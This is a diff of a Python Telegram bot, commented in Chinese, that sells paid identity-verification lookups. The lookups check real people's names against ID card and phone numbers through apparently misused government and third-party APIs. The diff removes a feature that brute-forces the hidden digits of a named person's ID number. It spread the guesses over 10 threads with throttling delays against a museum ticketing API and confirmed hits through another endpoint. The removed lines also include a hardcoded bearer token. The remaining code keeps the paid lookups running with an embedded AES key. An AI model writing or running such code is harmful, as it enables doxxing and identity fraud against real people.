@@ -33,9 +33,6 @@ ADMIN_ID = 6649617045
 ADMIN_USERNAME = "@aaSm68"
 POINTS_FILE = 'points.json'
 
-# 默认的终极裁判 Bearer Token（已替换为你提供的最新 Token，支持通过 /token 指令在线修改）
-DEFAULT_JUDGE_AUTH = "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjEzNDY1OTQyNzY4IiwicGhvbmVJbnZhbGlkIjowLCJuYW1lIjoiMTM0NjU5NDI3NjgiLCJjdXN0b21lcklkIjoiMjNmYTcwMzJiOTRjNDM5Y2E4OTMyMDI2ZjExZGUxNGEiLCJleHAiOjE3ODE3NjMxMjEsIm1kNSI6IjVGMTg3REU3RThEQ0ZCNDUwQTNCNkE5N0RFQjE3M0FBIn0.jaHijleQsXKrI6DoJxBcY5YJVqTQxwgdDfI1B1toHL4"
-
 # 新二要素国政接口配置
 API_USERINFO = "https://quickapp.gjzwfw.gov.cn/account/normal/userinfo-desensit"
 KEY_BASE64 = "YXVlQmdQTFR1OFY2NXRnVQ=="
@@ -85,179 +82,7 @@ def format_encry_aes_key():
     return ENCRY_AES_KEY.replace('\n', '%0A').replace('+', '%2B').replace('/', '%2F')
 
 
-# ================= 2. /fk 专属核验算法组件（一模一样） =================
-
-def is_valid_id_data(n):
-    """身份证合法性检查(精确算法)"""
-    if len(n) != 18: return False
-    try:
-        year, month, day = int(n[6:10]), int(n[10:12]), int(n[12:14])
-        if not (1950 <= year <= 2026 and 1 <= month <= 12 and 1 <= day <= 31): return False
-    except: return False
-    var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
-    var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
-    try:
-        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
-        return var_id[checksum] == n[17].upper()
-    except: return False
-
-def get_auth_from_file():
-    file_name = "token.txt"
-    if not os.path.exists(file_name):
-        with open(file_name, "w", encoding="utf-8") as f:
-            f.write(DEFAULT_JUDGE_AUTH)
-        return DEFAULT_JUDGE_AUTH
-    with open(file_name, "r", encoding="utf-8") as f:
-        auth = f.read().strip()
-        return auth if auth else DEFAULT_JUDGE_AUTH
-
-def verify_museum(id_num, target_name, headers, url):
-    """接口1:博物馆过滤器"""
-    payload = {
-        "contactName": target_name,
-        "contactPhone": "15815067442",
-        "documentType": "RLY0101",
-        "documentNumber": id_num,
-        "isPartyMember": 0, "myself": 0
-    }
-    try:
-        response = requests.post(url, headers=headers, json=payload, timeout=8)
-        res_json = response.json()
-        if (res_json.get("code") == 200 and res_json.get("data") is True) or ("已存在" in res_json.get("msg", "")):
-            return True
-        return False
-    except: return False
-
-def final_judge(id_num, target_name):
-    """接口2:二要素终极裁判"""
-    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
-    judge_auth = get_auth_from_file()
-    
-    headers = {
-        "Authorization": judge_auth,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x1800442a) NetType/WIFI Language/zh_CN",
-        "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"
-    }
-    payload = {"name": target_name, "idCardNo": id_num}
-    try:
-        response = requests.post(url, headers=headers, json=payload, timeout=10)
-        result = response.json()
-        return result.get("code") == 0 and result.get("success") is True
-    except: return False
-
-
-# ================= 3. 补齐爆破两轮逻辑核心（带电报显示） =================
-
-def make_progress_bar(percent, width=10):
-    hashes = int(round(percent / 100.0 * width))
-    spaces = width - hashes
-    return "[" + "█" * hashes + "░" * spaces + f"] {percent}%"
-
-def run_fk_expansion(chat_id, target_name, card_mask, uid):
-    """多线程两轮爆破逻辑"""
-    # 扣除积分
-    user_points[uid] -= 50.0
-    save_points()
-
-    wait_msg = bot.send_message(chat_id, "⏳ 正在初始化爆破字典...")
-    
-    museum_url = "https://newticket.szmuseum.com/japi/sw-saas-cloud/customerContact/save"
-    auth_token = "请在此处粘贴最新的AuthorizationC"
-    
-    headers = {
-        "Host": "newticket.szmuseum.com",
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68 NetType/WIFI Language/zh_CN",
-        "AuthorizationC": auth_token,
-        "token": "f3Qu372W6kD3HJzZvKvqy9VNCBZX+/txdZA42yjgQQY=",
-        "appId": "9eadb789046543df8b229ae99bb6e8ec"
-    }
-
-    # 1. 字典构建（精确对齐原py逻辑）
-    char_sets = [list("0123456789")] * 18
-    for i, ch in enumerate(card_mask):
-        if ch != 'x': char_sets[i] = [ch]
-        elif i == 17: char_sets[i] = list("0123456789X")
-
-    valid_ids = ["".join(r) for r in itertools.product(*char_sets) if is_valid_id_data("".join(r))]
-    total_count = len(valid_ids)
-    
-    if total_count == 0:
-        bot.edit_message_text("❌ 未生成任何合法的身份证组合，请检查输入格式。", chat_id, wait_msg.message_id)
-        return
-
-    bot.edit_message_text(f"📊 共得到 {total_count} 条有效有效号码。开始第一轮 10 线程全量核验...", chat_id, wait_msg.message_id)
-
-    # 2. 第一轮任务：10 线程全量核验
-    success_list = []
-    list_lock = threading.Lock()
-    completed = 0
-
-    def verify_task(id_num):
-        nonlocal completed
-        time.sleep(random.uniform(0.1, 0.4))
-        res = verify_museum(id_num, target_name, headers, museum_url)
-        with list_lock:
-            completed += 1
-            if res:
-                success_list.append(id_num)
-        time.sleep(0.5) # MIN_INTERVAL = 0.5
-
-    # 进度条刷新机制
-    def progress_updater():
-        last_percent = -1
-        while completed < total_count:
-            percent = int((completed / total_count) * 100)
-            if percent != last_percent:
-                try:
-                    bar = make_progress_bar(percent)
-                    bot.edit_message_text(f"⏳ <b>第一轮 10 线程核验中...</b>\n\n进度: {bar}\n已处理: {completed}/{total_count}", chat_id, wait_msg.message_id, parse_mode='HTML')
-                    last_percent = percent
-                except: pass
-            time.sleep(1.2)
-
-    updater_thread = threading.Thread(target=progress_updater)
-    updater_thread.start()
-
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        executor.map(verify_task, valid_ids)
-
-    updater_thread.join()
-
-    # 3. 第二轮任务：二次精准复核
-    if success_list:
-        try:
-            bot.edit_message_text(f"📡 第一轮发现 {len(success_list)} 个疑似结果，正在启动二次精准复核...", chat_id, wait_msg.message_id)
-        except: pass
-        
-        verified_final = None
-        for sid in success_list:
-            try:
-                bot.edit_message_text(f"正在核验: {target_name} <code>{sid}</code>...", chat_id, wait_msg.message_id, parse_mode='HTML')
-            except: pass
-            
-            time.sleep(1.2) # 严格遵守一模一样的 1.2s 延迟要求
-            
-            if final_judge(sid, target_name):
-                verified_final = sid
-                break # 找到真号直接退出循环
-
-        if verified_final:
-            result_text = (
-                f"🎉 <b>匹配到身份证号成功！</b>\n\n"
-                f"<b>结果:</b> {target_name}-{verified_final} 验证成功✅\n\n"
-                f"🪙 <b>已扣除 50 积分！余额: {user_points[uid]:.2f}</b>"
-            )
-            bot.delete_message(chat_id, wait_msg.message_id)
-            bot.send_message(chat_id, result_text, parse_mode='HTML')
-        else:
-            bot.edit_message_text(f"❌ 遗憾，初选中的号码均未通过二要素终审。\n🪙 <b>已扣除 50 积分！余额: {user_points[uid]:.2f}</b>", chat_id, wait_msg.message_id, parse_mode='HTML')
-    else:
-        bot.edit_message_text(f"❌ 核验结束，未发现匹配结果。\n🪙 <b>已扣除 50 积分！余额: {user_points[uid]:.2f}</b>", chat_id, wait_msg.message_id, parse_mode='HTML')
-
-
-# ================= 4. 原有二/三要素逻辑不变 =================
+# ================= 2. 功能逻辑 =================
 
 def query_3ys_logic(chat_id, name, id_card, phone, uid):
     """三要素核验"""
@@ -275,8 +100,9 @@ def query_3ys_logic(chat_id, name, id_card, phone, uid):
     except Exception as e: bot.edit_message_text(f"⚠️ 核验异常: {str(e)}", chat_id, wait_msg.message_id)
 
 def single_verify_2ys(chat_id, name, id_card, uid):
-    """二要素核验 - 国政新接口"""
+    """二要素核验 - 已替换为国政新接口逻辑"""
     wait_msg = bot.send_message(chat_id, "⏳ 正在进行国政二要素核验...")
+    
     try:
         cipher = AESCipher()
         enc_name = cipher.encrypt(name)
@@ -292,17 +118,24 @@ def single_verify_2ys(chat_id, name, id_card, uid):
         'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2)',
         'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
     }
+
     try:
         resp = requests.post(API_USERINFO, headers=headers, data=body, timeout=15)
         resp_text = resp.text
-        user_points[uid] -= 0.01; save_points()
         
+        # 扣除积分
+        user_points[uid] -= 0.01
+        save_points()
+        
+        # 默认解析状态
         status_title = "🟡 二要素核验失败"
         status_detail = ""
+        
         try:
             data = json.loads(resp_text)
             code = data.get("code")
             has_success = "success" in resp_text
+
             if has_success and "data" in data and data["data"]:
                 status_title = "二要素核验一致✅"
                 status_detail = f"\n<b>返回数据:</b> {data['data']}"
@@ -314,9 +147,12 @@ def single_verify_2ys(chat_id, name, id_card, uid):
                 status_detail = f"\n<b>详情:</b> 无国政账号"
             elif code == 20000 and "验证失败" in resp_text:
                 status_title = "二要素验证失败❌"
-            else: status_detail = f"\n原始响应: {resp_text}"
-        except: status_detail = f"\n原始响应: {resp_text}"
+            else:
+                status_detail = f"\n原始响应: {resp_text}"
+        except:
+            status_detail = f"\n原始响应: {resp_text}"
 
+        # 组装发给用户的消息
         result_msg = (
             f"<b>姓名:</b> {name}\n"
             f"<b>身份证:</b> <code>{id_card}</code>\n"
@@ -326,9 +162,11 @@ def single_verify_2ys(chat_id, name, id_card, uid):
         )
         bot.delete_message(chat_id, wait_msg.message_id)
         bot.send_message(chat_id, result_msg, parse_mode='HTML')
-    except Exception as e: bot.edit_message_text(f"❌ 请求异常: {str(e)}", chat_id, wait_msg.message_id)
 
-# ================= 5. UI 菜单（严格改回原貌） =================
+    except Exception as e: 
+        bot.edit_message_text(f"❌ 请求异常: {str(e)}", chat_id, wait_msg.message_id)
+
+# ================= 3. UI 菜单 =================
 
 def get_main_markup():
     markup = types.InlineKeyboardMarkup(row_width=2)
@@ -356,9 +194,9 @@ def get_main_text(source, uid, pts):
             f"<b>在线充值可支持24小时</b>\n"
             f"<b>1 USDT = 1 积分</b>")
 
-# ================= 6. 消息与命令处理 =================
+# ================= 4. 消息处理 =================
 
-@bot.message_handler(commands=['start', '3ys', '2ys', 'fk', 'token', 'add'])
+@bot.message_handler(commands=['start', '3ys', '2ys', 'add'])
 def handle_commands(message):
     uid, chat_id = message.from_user.id, message.chat.id
     cmd_parts = message.text.split()
@@ -368,31 +206,12 @@ def handle_commands(message):
     if cmd == 'start':
         if uid not in user_points: user_points[uid] = 0.0
         bot.send_message(chat_id, get_main_text(message, uid, user_points[uid]), parse_mode='HTML', reply_markup=get_main_markup())
-    
     elif cmd == '2ys':
         if current_pts < 0.01: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
-        bot.send_message(chat_id, "请输入:姓名 身份证")
-        
+        bot.send_message(chat_id, "请输入:姓名 身份证"); user_states[chat_id] = {'step': 'v_2ys'}
     elif cmd == '3ys':
         if current_pts < 0.05: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
-        bot.send_message(chat_id, "请输入:姓名 身份证 手机号")
-        
-    elif cmd == 'fk':
-        if current_pts < 50.0: return bot.send_message(chat_id, "<b>积分不足 50 积分, 无法使用身份证补齐爆破!</b>", parse_mode='HTML')
-        if len(cmd_parts) < 3: return bot.send_message(chat_id, "⚠️ 格式错误！使用方法：<code>/fk 谢超宇 41052720100609xxxx</code>", parse_mode='HTML')
-        name = cmd_parts[1]
-        card_mask = cmd_parts[2].lower()
-        threading.Thread(target=run_fk_expansion, args=(chat_id, name, card_mask, uid)).start()
-
-    elif cmd == 'token':
-        if uid == ADMIN_ID:
-            if len(cmd_parts) < 2: return bot.reply_to(message, "⚠️ 请指定新的 Token。例如：`/token bearer xxx`")
-            new_token = message.text.split(None, 1)[1].strip()
-            with open("token.txt", "w", encoding="utf-8") as f:
-                f.write(new_token)
-            bot.reply_to(message, "✅ <b>裁判 Token 已成功在代码级与配置文件中动态替换！</b>", parse_mode='HTML')
-        else: bot.reply_to(message, "⛔ 您没有权限访问此命令!")
-
+        bot.send_message(chat_id, "请输入:姓名 身份证 手机号"); user_states[chat_id] = {'step': 'v_3ys'}
     elif cmd == 'add':
         if uid == ADMIN_ID:
             try:
@@ -408,21 +227,10 @@ def handle_commands(message):
 def handle_all_text(message):
     uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
     if text.startswith('/'): return
-    current_pts = user_points.get(uid, 0.0)
+    current_pts = user_points.get(uid, 0.0); state = user_states.get(chat_id, {})
     
     parts = re.split(r'[,,\s\n]+', text)
     
-    # 模糊文本识别自动触发（含小写 x 且为 2 段内容）
-    if 'x' in text.lower() and len(parts) == 2:
-        name, card_mask = None, None
-        for x in parts:
-            if not name and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): name = x
-            elif not card_mask and re.match(r'^[0-9xX]{15,18}$', x): card_mask = x.lower()
-        if name and card_mask:
-            if current_pts < 50.0: return bot.send_message(chat_id, "<b>积分不足 50 积分, 无法使用身份证补齐爆破!</b>", parse_mode='HTML')
-            threading.Thread(target=run_fk_expansion, args=(chat_id, name, card_mask, uid)).start()
-            return
-
     # 三要素自动识别
     if len(parts) >= 3:
         n, p, i = None, None, None
@@ -434,7 +242,7 @@ def handle_all_text(message):
             if current_pts < 0.05: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
             return query_3ys_logic(chat_id, n, i, p, uid)
             
-    # 二要素自动识别
+    # 二要素自动识别 (已完美接入新接口)
     if len(parts) == 2:
         n, i = None, None
         for x in parts:
@@ -446,14 +254,13 @@ def handle_all_text(message):
     
     bot.send_message(chat_id, "⚠️ 无法识别您的输入,请发送 /start 查看可用功能。")
 
-# ================= 7. 回调处理 =================
+# ================= 5. 回调处理 =================
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
     uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
     
     if call.data == "view_help":
-        # 原汁原味最原始的使用帮助格式
         help_text = (
             "<b>🛠️ 使用帮助</b>\n"
             "<b>名字-身份证核验 (企业级)</b>\n"
@@ -473,5 +280,5 @@ def handle_callback(call):
         bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=get_main_markup())
 
 if __name__ == '__main__':
-    print("Bot 正在运行 (已集成完全对齐原逻辑的爆破模块)...")
+    print("Bot 正在运行 (二要素已接入国政通新接口)...")
     bot.infinity_polling(timeout=10)
